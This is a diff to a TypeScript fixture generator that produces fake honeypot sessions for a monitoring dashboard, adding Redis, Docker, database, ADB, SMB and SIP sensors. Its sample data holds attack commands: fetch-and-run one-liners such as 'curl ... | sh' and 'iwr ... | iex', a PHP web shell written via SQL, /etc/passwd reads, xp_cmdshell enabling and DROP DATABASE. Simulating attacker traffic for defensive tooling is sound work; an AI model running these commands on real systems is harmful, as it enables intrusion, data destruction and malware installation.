@@ -5,6 +5,7 @@
  * made up. Times are relative to when the module loads, so the UI looks live.
  */
 import type { SensorEvent, Session, Sensor } from "@/lib/api"
+import { SENSOR_META, SENSORS } from "@/lib/sensors"
 
 function mulberry32(seed: number) {
   let a = seed >>> 0
@@ -31,17 +32,45 @@ function int(rand: Rand, min: number, max: number) {
 
 const PREFIXES = ["192.0.2", "198.51.100", "203.0.113"] as const
 
+// Weighted like a real Swiss sensor sees it: mostly neighbours and big clouds
+// (France, Germany, Netherlands, United States, China), then a long tail.
+const FR = { country: "FR", city: "Roubaix", asn: 64505, org: "Hexagone Serveurs" }
+const DE = { country: "DE", city: "Frankfurt", asn: 64499, org: "Rhein Compute GmbH" }
+const NL = { country: "NL", city: "Amsterdam", asn: 64496, org: "Polder Cloud BV" }
+const US = { country: "US", city: "Ashburn", asn: 64497, org: "Example Hosting LLC" }
+const CN = { country: "CN", city: "Shenzhen", asn: 64498, org: "Sample Telecom" }
+/** The persistent heavy hitters, pinned to the countries that dominate real traffic. */
+const REPEAT_ORIGIN: Record<string, typeof FR> = {
+  "203.0.113.77": FR,
+  "198.51.100.23": DE,
+  "192.0.2.14": NL,
+  "198.51.100.41": FR,
+  "192.0.2.85": US,
+}
 const ORIGINS: readonly { country: string; city: string; asn: number; org: string }[] = [
-  { country: "NL", city: "Amsterdam", asn: 64496, org: "Polder Cloud BV" },
-  { country: "US", city: "Ashburn", asn: 64497, org: "Example Hosting LLC" },
-  { country: "CN", city: "Shenzhen", asn: 64498, org: "Sample Telecom" },
-  { country: "DE", city: "Frankfurt", asn: 64499, org: "Rhein Compute GmbH" },
+  FR,
+  FR,
+  FR,
+  FR,
+  DE,
+  DE,
+  DE,
+  NL,
+  NL,
+  NL,
+  US,
+  US,
+  US,
+  CN,
+  CN,
+  { country: "IT", city: "Milan", asn: 64508, org: "Navigli Hosting Srl" },
+  { country: "AT", city: "Vienna", asn: 64509, org: "Donau Datacenter GmbH" },
+  { country: "PL", city: "Warsaw", asn: 64510, org: "Wisla Net" },
   { country: "RU", city: "Moscow", asn: 64500, org: "Demo Networks" },
   { country: "BR", city: "São Paulo", asn: 64501, org: "Placeholder Fibra" },
   { country: "IN", city: "Mumbai", asn: 64502, org: "Docs Broadband" },
   { country: "VN", city: "Hanoi", asn: 64503, org: "Test Mobile" },
   { country: "SG", city: "Singapore", asn: 64504, org: "Lion VPS Pte" },
-  { country: "FR", city: "Roubaix", asn: 64505, org: "Hexagone Serveurs" },
   { country: "KR", city: "Seoul", asn: 64506, org: "Han River Data" },
   { country: "GB", city: "London", asn: 64507, org: "Thames Transit Ltd" },
 ]
@@ -88,7 +117,59 @@ const AGENTS = [
   "zgrab/0.x",
 ]
 
-const DST_PORT: Record<Sensor, number> = { ssh: 22, telnet: 23, web: 80, rdp: 3389 }
+// The new sensors (M9): realistic request shapes, documentation addresses only.
+const REDIS_COMMANDS = [
+  "INFO server",
+  "CONFIG GET dir",
+  "CONFIG SET dir /var/spool/cron/",
+  "CONFIG SET dbfilename root",
+  "SLAVEOF 198.51.100.7 8886",
+  "MODULE LOAD /tmp/exp.so",
+  "FLUSHALL",
+  "KEYS *",
+]
+const DOCKER_PATHS = [
+  "/version",
+  "/info",
+  "/containers/json?all=1",
+  "/images/json",
+  "/v1.41/containers/create",
+  "/images/create?fromImage=alpine&tag=latest",
+]
+const MYSQL_QUERIES = [
+  "SELECT @@version_comment LIMIT 1",
+  "SHOW DATABASES",
+  "SELECT user, host FROM mysql.user",
+  "SELECT LOAD_FILE('/etc/passwd')",
+  "SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/html/x.php'",
+  "DROP DATABASE shop",
+]
+const MSSQL_QUERIES = [
+  "SELECT @@VERSION",
+  "EXEC sp_configure 'show advanced options', 1; RECONFIGURE",
+  "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE",
+  "EXEC xp_cmdshell 'whoami'",
+  "EXEC xp_cmdshell 'net user'",
+]
+const ADB_COMMANDS = [
+  "shell:getprop ro.product.model",
+  "shell:uname -a",
+  "shell:cd /data/local/tmp",
+  "shell:pm list packages",
+  "shell:ps | grep -i miner",
+]
+const DB_USERS: Partial<Record<Sensor, readonly string[]>> = {
+  redis: ["default"],
+  mysql: ["root", "admin", "mysql", "test"],
+  mssql: ["sa", "admin", "sql"],
+  sip: ["100", "1000", "1001", "2000", "admin"],
+  smb: ["", "guest", "administrator"],
+}
+
+const DST_PORT = Object.fromEntries(SENSORS.map((s) => [s, SENSOR_META[s].port])) as Record<
+  Sensor,
+  number
+>
 
 export interface Fixture {
   session: Session
@@ -121,7 +202,8 @@ export function buildFixtures(count = 420, now = Date.now(), seed = 7): Fixture[
   const out: Fixture[] = []
   let eventId = 1000
   // A few repeat visitors so the IP filter has something to show.
-  const repeatIps = ["203.0.113.77", "198.51.100.23", "192.0.2.14"]
+  // Real traffic is dominated by a few persistent addresses.
+  const repeatIps = ["203.0.113.77", "198.51.100.23", "192.0.2.14", "198.51.100.41", "192.0.2.85"]
   let t = now - 40_000
 
   for (let i = 0; i < count; i++) {
@@ -137,15 +219,24 @@ export function buildFixtures(count = 420, now = Date.now(), seed = 7): Fixture[
       "web",
       "web",
       "rdp",
+      "redis",
+      "redis",
+      "docker",
+      "mysql",
+      "mssql",
+      "adb",
+      "smb",
+      "smb",
+      "sip",
     ] as const)
     const src_ip =
-      rand() < 0.12 ? pick(rand, repeatIps) : `${pick(rand, PREFIXES)}.${int(rand, 2, 254)}`
+      rand() < 0.3 ? pick(rand, repeatIps) : `${pick(rand, PREFIXES)}.${int(rand, 2, 254)}`
     // Origin and enrichment belong to the address, not the session: one IP, one origin.
     rand()
     rand()
     const h = ipHash(src_ip)
     const enriched = h % 100 < 85
-    const origin = ORIGINS[h % ORIGINS.length] ?? ORIGINS[0]
+    const origin = REPEAT_ORIGIN[src_ip] ?? ORIGINS[h % ORIGINS.length] ?? ORIGINS[0]
     if (!origin) throw new Error("no origins")
     const id = sessionId(rand)
     const src_port = int(rand, 32768, 60999)
@@ -159,17 +250,78 @@ export function buildFixtures(count = 420, now = Date.now(), seed = 7): Fixture[
     let http_requests = 0
 
     const roll = rand()
+    // Commands as they were typed or sent (shell lines, Redis commands, SQL, ADB services).
+    const typed: string[] = []
+    let scans = 0
+    let malwareUrl: string | null = null
+    const host = () => `${pick(rand, PREFIXES)}.${int(rand, 2, 254)}`
     if (sensor === "web") {
       http_requests = int(rand, 1, roll < 0.2 ? 40 : 6)
       if (roll < 0.25) tags.push("php2shell")
       else if (roll < 0.55) tags.push("recon")
     } else if (sensor === "rdp") {
       login_attempts = roll < 0.3 ? 0 : int(rand, 1, 60)
+    } else if (sensor === "docker") {
+      http_requests = int(rand, 2, 7)
+      if (roll < 0.35) {
+        tags.push("crypto-miner")
+        if (rand() < 0.5) tags.push("container-escape")
+        downloads = 1
+        malwareUrl = `http://${host()}/xmrig.tar.gz`
+      } else tags.push("recon")
+    } else if (sensor === "redis") {
+      login_attempts = roll < 0.5 ? 0 : int(rand, 1, 25)
+      login_success = login_attempts === 0 || rand() < 0.4
+      commands = login_success ? int(rand, 1, 7) : 0
+      for (let k = 0; k < commands; k++) typed.push(pick(rand, REDIS_COMMANDS))
+      if (typed.some((c) => c.startsWith("SLAVEOF"))) tags.push("redis-rogue-master")
+      if (login_success && rand() < 0.35) {
+        tags.push("crypto-miner")
+        downloads = 1
+        malwareUrl = `http://${host()}/kinsing`
+        typed.push(`SET backup1 "*/2 * * * * curl -fsSL ${malwareUrl} | sh"`)
+        commands += 1
+      }
+    } else if (sensor === "mysql" || sensor === "mssql") {
+      login_attempts = int(rand, 2, roll < 0.4 ? 90 : 14)
+      login_success = rand() < 0.22
+      if (login_success) {
+        commands = int(rand, 1, 5)
+        const pool = sensor === "mysql" ? MYSQL_QUERIES : MSSQL_QUERIES
+        for (let k = 0; k < commands; k++) typed.push(pick(rand, pool))
+        if (typed.some((c) => c.startsWith("DROP DATABASE"))) tags.push("db-ransom")
+        if (sensor === "mssql" && rand() < 0.5) {
+          tags.push("malware-drop", "sql-rce")
+          downloads = 1
+          malwareUrl = `http://${host()}/a.ps1`
+          typed.push(`EXEC xp_cmdshell 'powershell -c "iwr ${malwareUrl} | iex"'`)
+          commands += 1
+        }
+      }
+    } else if (sensor === "adb") {
+      commands = int(rand, 1, 5)
+      for (let k = 0; k < commands; k++) typed.push(pick(rand, ADB_COMMANDS))
+      if (roll < 0.45) {
+        tags.push(rand() < 0.6 ? "crypto-miner" : "mirai")
+        downloads = 1
+        malwareUrl = `http://${host()}/adbminer.sh`
+        typed.push(`shell:busybox wget ${malwareUrl} -O- | sh`)
+        commands += 1
+      }
+    } else if (sensor === "smb") {
+      scans = int(rand, 1, 3)
+      login_attempts = roll < 0.5 ? 0 : int(rand, 1, 4)
+      tags.push(roll < 0.2 ? "eternalblue" : "recon")
+    } else if (sensor === "sip") {
+      scans = int(rand, 1, 4)
+      login_attempts = roll < 0.4 ? 0 : int(rand, 1, 30)
+      tags.push(roll > 0.85 ? "sip-fraud" : "recon")
     } else {
       login_attempts = roll < 0.12 ? 0 : int(rand, 1, roll < 0.5 ? 12 : 140)
       login_success = login_attempts > 0 && rand() < 0.3
       if (login_success) {
         commands = int(rand, 1, 14)
+        for (let k = 0; k < commands; k++) typed.push(pick(rand, COMMANDS))
         if (rand() < 0.35) {
           downloads = int(rand, 1, 3)
           tags.push(pick(rand, ["crypto-miner", "mirai", "malware-drop"] as const))
@@ -199,31 +351,85 @@ export function buildFixtures(count = 420, now = Date.now(), seed = 7): Fixture[
     }
 
     push("connect", sensor === "ssh" ? { client_version: "SSH-2.0-libssh_0.9.6" } : {}, 0)
+    for (let k = 0; k < scans; k++) {
+      if (sensor === "smb") {
+        const eb = tags.includes("eternalblue")
+        push(
+          "scan",
+          {
+            kind: eb ? "smb_trans2" : "smb_negotiate",
+            dialects: ["NT LM 0.12", "SMB 2.002", "SMB 2.???"],
+            flags: eb ? ["smbv1", "ms17_010", "eternalblue"] : ["smbv1"],
+          },
+          int(rand, 50, 600),
+        )
+      } else {
+        const method = tags.includes("sip-fraud")
+          ? "INVITE"
+          : pick(rand, ["OPTIONS", "REGISTER"] as const)
+        push(
+          "scan",
+          {
+            kind: "sip_request",
+            method,
+            user_agent: pick(rand, ["friendly-scanner", "sipvicious", "PolyPhone/1.0"]),
+            flags: method === "INVITE" ? ["invite", "toll_fraud"] : [method.toLowerCase()],
+          },
+          int(rand, 100, 1500),
+        )
+      }
+    }
+    const users = DB_USERS[sensor] ?? USERNAMES
     for (let k = 0; k < login_attempts; k++) {
       const last = k === login_attempts - 1
       push(
         "login_attempt",
         {
-          username: pick(rand, USERNAMES),
+          username: pick(rand, users),
           password: pick(rand, PASSWORDS),
           success: login_success && last,
-          method: "password",
+          method: sensor === "mssql" ? "sql" : "password",
         },
         int(rand, 300, 2500),
       )
     }
-    for (let k = 0; k < commands; k++) {
-      push("command", { input: pick(rand, COMMANDS) }, int(rand, 800, 6000))
+    for (const input of typed) {
+      push("command", { input }, int(rand, 800, 6000))
     }
     for (let k = 0; k < downloads; k++) {
-      const host = `${pick(rand, PREFIXES)}.${int(rand, 2, 254)}`
       push(
         "download_attempt",
-        { url: `http://${host}/bins/x86_64`, tool: pick(rand, ["wget", "curl"]), command: "" },
+        {
+          url: malwareUrl ?? `http://${host()}/bins/x86_64`,
+          tool: sensor === "docker" ? "image" : pick(rand, ["wget", "curl"]),
+          command: "",
+        },
         int(rand, 500, 3000),
       )
     }
     for (let k = 0; k < http_requests; k++) {
+      if (sensor === "docker") {
+        const path = DOCKER_PATHS[Math.min(k, DOCKER_PATHS.length - 1)] ?? "/version"
+        push(
+          "http_request",
+          {
+            method: path.includes("create") ? "POST" : "GET",
+            path,
+            user_agent: pick(rand, [
+              "Docker-Client/24.0.7 (linux)",
+              "Go-http-client/1.1",
+              "curl/8.5.0",
+            ]),
+            status: path.includes("create") ? 201 : 200,
+            flags:
+              path.includes("containers/create") && tags.includes("crypto-miner")
+                ? ["container_create", "privileged", "host_mount", "miner"]
+                : [],
+          },
+          int(rand, 100, 1500),
+        )
+        continue
+      }
       push(
         "http_request",
         {
